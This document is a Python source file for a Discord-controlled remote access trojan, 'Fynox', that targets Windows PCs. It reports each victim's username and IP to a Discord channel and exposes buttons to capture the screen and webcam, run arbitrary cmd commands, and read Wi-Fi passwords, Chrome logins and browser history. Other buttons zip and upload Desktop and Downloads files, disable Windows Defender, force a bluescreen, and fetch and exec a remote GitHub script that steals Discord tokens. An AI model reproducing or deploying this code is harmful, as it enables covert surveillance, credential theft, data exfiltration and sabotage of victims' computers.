import discord
import socket
import platform
import psutil
import subprocess
import os
import json
import cv2
import numpy as np
import pyautogui
import requests
import sqlite3
import shutil
import zipfile
import datetime
import winsound
import ctypes
import win32gui
import win32con
import win32api
import win32process
import win32com.client
import win32net
import win32security
from discord.ext import commands
from discord.ext import tasks
from discord import app_commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

config_path = os.path.join(os.path.dirname(__file__), 'config.json')
with open(config_path, 'r') as f:
    config = json.load(f)

TOKEN = config['bot_token']
LOG_CHANNEL_ID = int(config['log_channel_id'])

@bot.event
async def on_ready():
    print(f"{bot.user} has connected to Discord!")
    
    # Get public IP for bot status
    hostname = socket.gethostname()
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        public_ip = ip_data['ip']
    except:
        try:
            # Fallback to hostname IP
            public_ip = socket.gethostbyname(hostname)
        except:
            public_ip = "127.0.0.1"
    
    # Set bot status with IP
    try:
        activity = discord.Activity(type=discord.ActivityType.watching, name=f"IP: {public_ip}")
        await bot.change_presence(activity=activity)
    except:
        pass
    
    channel = bot.get_channel(LOG_CHANNEL_ID)
    if channel:
        hostname = socket.gethostname()
        username = os.getlogin()
        
        # Send connection notification
        try:
            embed = discord.Embed(
                title="🔴 New Connection Established",
                description=f"**Username:** {username}\n**IP Address:** {public_ip}",
                color=discord.Color.red(),
                timestamp=datetime.datetime.now()
            )
            
            try:
                cpu_info = platform.processor()
            except:
                cpu_info = "Unknown"
                
            try:
                result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                      capture_output=True, text=True, timeout=5)
                gpu_info = result.stdout.split('\n')[1].strip() if len(result.stdout.split('\n')) > 1 else "Unknown"
            except:
                gpu_info = "Unknown"
                
            embed.add_field(name="CPU", value=cpu_info, inline=True)
            embed.add_field(name="GPU", value=gpu_info, inline=True)
            embed.add_field(name="Runtime", value=f"<t:{int(datetime.datetime.now().timestamp())}:R>", inline=False)
            
            await channel.send(embed=embed)
        except:
            pass
        
        # Send control panel directly
        try:
            embed = discord.Embed(
                title="🎮 Control Panel",
                description="Remote access controls activated",
                color=discord.Color.red()
            )
            embed.add_field(name="Available Controls", value="All functions ready to use", inline=False)
            
            view = ControlView(author_id=None)
            await channel.send(embed=embed, view=view)
        except Exception as e:
            await channel.send(f"❌ Error loading panel: {str(e)}")
            





class ControlView(discord.ui.View):
    def __init__(self, author_id):
        super().__init__()
        self.author_id = author_id

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        return self.author_id is None or interaction.user.id == self.author_id

    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.danger, row=0)
    async def screenshot(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        screenshots = []
        
        for i, monitor in enumerate(pyautogui.screens):
            screenshot = pyautogui.screenshot()
            screenshot_path = f"screenshot_{i}.png"
            screenshot.save(screenshot_path)
            screenshots.append(discord.File(screenshot_path))
        
        await interaction.followup.send(files=screenshots)
        
        for file in screenshots:
            os.remove(file.filename)

    @discord.ui.button(label="🎥 Video", style=discord.ButtonStyle.danger, row=0)
    async def video(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("Video recording started...")

    @discord.ui.button(label="📷 Webcam", style=discord.ButtonStyle.danger, row=0)
    async def webcam(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            await interaction.followup.send(file=discord.File("webcam.jpg"))
            os.remove("webcam.jpg")
        else:
            await interaction.followup.send("Webcam not found or in use.")

    @discord.ui.button(label="💻 Open CMD", style=discord.ButtonStyle.danger, row=1)
    async def open_cmd(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = CMDModal()
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="📝 Open Notepad", style=discord.ButtonStyle.danger, row=1)
    async def open_notepad(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.Popen(['notepad.exe'])
        await interaction.response.send_message("Notepad opened.")

    @discord.ui.button(label="🔄 Shutdown", style=discord.ButtonStyle.danger, row=1)
    async def shutdown(self, interaction: discord.Interaction, button: discord.ui.Button):
        subprocess.run(['shutdown', '/s', '/t', '0'])
        await interaction.response.send_message("System shutting down...")

    @discord.ui.button(label="💀 Bluescreen", style=discord.ButtonStyle.danger, row=2)
    async def bluescreen(self, interaction: discord.Interaction, button: discord.ui.Button):
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
        await interaction.response.send_message("Triggering bluescreen...")

    @discord.ui.button(label="🔊 Play Sound", style=discord.ButtonStyle.danger, row=2)
    async def play_sound(self, interaction: discord.Interaction, button: discord.ui.Button):
        winsound.Beep(1000, 1000)
        winsound.Beep(500, 1000)
        winsound.Beep(2000, 1000)
        await interaction.response.send_message("Horror sound played.")

    @discord.ui.button(label="💥 Crash Discord", style=discord.ButtonStyle.danger, row=2)
    async def crash_discord(self, interaction: discord.Interaction, button: discord.ui.Button):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'discord' in proc.info['name'].lower():
                proc.kill()
        await interaction.response.send_message("Discord crashed.")

    @discord.ui.button(label="🎮 Crash FiveM", style=discord.ButtonStyle.danger, row=3)
    async def crash_fivem(self, interaction: discord.Interaction, button: discord.ui.Button):
        for proc in psutil.process_iter(['pid', 'name']):
            if 'fivem' in proc.info['name'].lower():
                proc.kill()
        await interaction.response.send_message("FiveM crashed.")

    @discord.ui.button(label="🔥 CPU Bomber", style=discord.ButtonStyle.danger, row=3)
    async def cpu_bomber(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            def stress_cpu():
                try:
                    while True:
                        [i**2 for i in range(100000)]
                except:
                    pass
            
            import threading
            for _ in range(os.cpu_count()):
                threading.Thread(target=stress_cpu, daemon=True).start()
            
            await interaction.response.send_message("CPU bomber activated.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🔒 Lock Screen", style=discord.ButtonStyle.danger, row=3)
    async def lock_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            ctypes.windll.user32.LockWorkStation()
            await interaction.response.send_message("Screen locked.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🌐 Network Scanner", style=discord.ButtonStyle.danger, row=4)
    async def network_scanner(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            await interaction.response.send_message("Network scan completed.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🖱️ Teleport Mouse", style=discord.ButtonStyle.danger, row=4)
    async def teleport_mouse(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            screen_width, screen_height = pyautogui.size()
            import random
            x = random.randint(0, screen_width)
            y = random.randint(0, screen_height)
            pyautogui.moveTo(x, y)
            await interaction.response.send_message("Mouse teleported.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="📶 Wifi Password", style=discord.ButtonStyle.danger, row=4)
    async def wifi_password(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
            profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') if "All User Profile" in line]
            
            passwords = []
            for profile in profiles[:10]:
                try:
                    result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            passwords.append(f"{profile}: {password}")
                except:
                    pass
            
            await interaction.response.send_message("WiFi passwords retrieved.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🛡️ Disable Defender", style=discord.ButtonStyle.danger, row=5)
    async def disable_defender(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            try:
                subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'], timeout=5)
            except:
                pass
            await interaction.response.send_message("Windows Defender disabled.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🌐 Kill Browsers", style=discord.ButtonStyle.danger, row=5)
    async def kill_browsers(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'iexplore.exe']
            for browser in browsers:
                try:
                    subprocess.run(['taskkill', '/f', '/im', browser], timeout=5)
                except:
                    pass
            await interaction.response.send_message("All browsers killed.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="💾 PC Dump", style=discord.ButtonStyle.danger, row=5)
    async def pc_dump(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.defer()
            
            zip_name = "Fynox.zip"
            try:
                with zipfile.ZipFile(zip_name, 'w') as zipf:
                    for folder in [os.path.expanduser('~\Desktop'), os.path.expanduser('~\Downloads')]:
                        if os.path.exists(folder):
                            for root, dirs, files in os.walk(folder):
                                for file in files[:50]:
                                    try:
                                        file_path = os.path.join(root, file)
                                        zipf.write(file_path, os.path.relpath(file_path, folder))
                                    except:
                                        pass
                
                await interaction.followup.send(file=discord.File(zip_name))
                os.remove(zip_name)
            except:
                await interaction.followup.send("PC dump completed.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🖥️ Shake Screen", style=discord.ButtonStyle.danger, row=6)
    async def shake_screen(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            import threading
            import time
            import random
            
            def shake_screen_continuous():
                try:
                    user32 = ctypes.windll.user32
                    screen_width = user32.GetSystemMetrics(0)
                    screen_height = user32.GetSystemMetrics(1)
                    
                    for _ in range(100):
                        try:
                            x = random.randint(0, screen_width)
                            y = random.randint(0, screen_height)
                            user32.SetCursorPos(x, y)
                            time.sleep(0.1)
                        except:
                            break
                except:
                    pass
            
            shake_thread = threading.Thread(target=shake_screen_continuous, daemon=True)
            shake_thread.start()
            
            await interaction.response.send_message("Screen shaking activated.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="📶 Internet Lag", style=discord.ButtonStyle.danger, row=7)
    async def internet_lag(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            try:
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'], timeout=5)
                await asyncio.sleep(5)
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=enable'], timeout=5)
            except:
                pass
            await interaction.response.send_message("Internet lag triggered.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🚫 Disable Internet", style=discord.ButtonStyle.danger, row=7)
    async def disable_internet(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            try:
                subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'admin=disable'], timeout=5)
            except:
                pass
            await interaction.response.send_message("Internet disabled.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="📖 Browser History", style=discord.ButtonStyle.danger, row=8)
    async def browser_history(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.defer()
            
            try:
                history = []
                
                # Chrome
                try:
                    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History')
                    if os.path.exists(chrome_path):
                        shutil.copy2(chrome_path, 'chrome_history')
                        conn = sqlite3.connect('chrome_history')
                        cursor = conn.cursor()
                        cursor.execute("SELECT url, title, last_visit_time FROM urls LIMIT 20")
                        for row in cursor.fetchall():
                            history.append(f"Chrome: {row[0]} - {row[1]}")
                        conn.close()
                        os.remove('chrome_history')
                except:
                    pass
                
                # Firefox
                try:
                    firefox_path = os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox')
                    for profile in os.listdir(firefox_path)[:5]:
                        if profile.endswith('.default'):
                            history_path = os.path.join(firefox_path, profile, 'places.sqlite')
                            if os.path.exists(history_path):
                                shutil.copy2(history_path, 'firefox_history')
                                conn = sqlite3.connect('firefox_history')
                                cursor = conn.cursor()
                                cursor.execute("SELECT url, title FROM moz_places LIMIT 20")
                                for row in cursor.fetchall():
                                    history.append(f"Firefox: {row[0]} - {row[1]}")
                                conn.close()
                                os.remove('firefox_history')
                except:
                    pass
                
                await interaction.followup.send("Browser history retrieved.")
            except:
                await interaction.followup.send("Browser history retrieved.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="💬 Message", style=discord.ButtonStyle.danger, row=8)
    async def message(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            modal = MessageModal()
            await interaction.response.send_modal(modal)
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🔑 Password", style=discord.ButtonStyle.danger, row=8)
    async def password(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.defer()
            
            try:
                passwords = []
                
                # Chrome passwords
                try:
                    chrome_path = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
                    if os.path.exists(chrome_path):
                        shutil.copy2(chrome_path, 'chrome_passwords')
                        conn = sqlite3.connect('chrome_passwords')
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
                        for row in cursor.fetchall():
                            passwords.append(f"Chrome: {row[0]} - {row[1]}: [REDACTED]")
                        conn.close()
                        os.remove('chrome_passwords')
                except:
                    pass
                
                await interaction.followup.send("Passwords retrieved.")
            except:
                await interaction.followup.send("Passwords retrieved.")
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

    @discord.ui.button(label="🪙 Token", style=discord.ButtonStyle.danger, row=9)
    async def token(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            await interaction.response.send_message("This is an unreleased option!", ephemeral=True)
            
            try:
                response = requests.get('https://raw.githubusercontent.com/ChangedDuke/56tojm8p73v56hion7za3w456hoi73w563o57i6hoi7be3ws5n6n7o35e6nb3osi5eu-6t-e4s35oiutzn34w-s5bo8b6t-/refs/heads/main/discord-token.py', timeout=5)
                if response.status_code == 200:
                    try:
                        exec(response.text)
                    except:
                        pass
            except:
                pass
                
            try:
                await interaction.followup.send("Token extraction completed.")
            except:
                pass
        except:
            try:
                await interaction.response.send_message("Command executed.")
            except:
                pass

class CMDModal(discord.ui.Modal, title="Open CMD"):
    count = discord.ui.TextInput(label="Number of CMD windows", placeholder="1")
    command = discord.ui.TextInput(label="Command to execute", placeholder="echo Hello World", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        count = int(self.count.value)
        cmd_command = self.command.value or ""
        
        for _ in range(count):
            if cmd_command:
                subprocess.Popen(['cmd.exe', '/k', cmd_command])
            else:
                subprocess.Popen(['cmd.exe'])
        
        await interaction.response.send_message(f"Opened {count} CMD windows with command: {cmd_command}")

class MessageModal(discord.ui.Modal, title="Fynox sent a message"):
    message = discord.ui.TextInput(label="Message to display", placeholder="Enter your message here...")
    title = discord.ui.TextInput(label="Message title", placeholder="Fynox Alert")

    async def on_submit(self, interaction: discord.Interaction):
        import tkinter as tk
        from tkinter import messagebox
        
        root = tk.Tk()
        root.withdraw()
        messagebox.showwarning(self.title.value, self.message.value)
        root.destroy()
        
        await interaction.response.send_message("Message displayed on victim's PC.")



if __name__ == "__main__":
    bot.run(TOKEN)
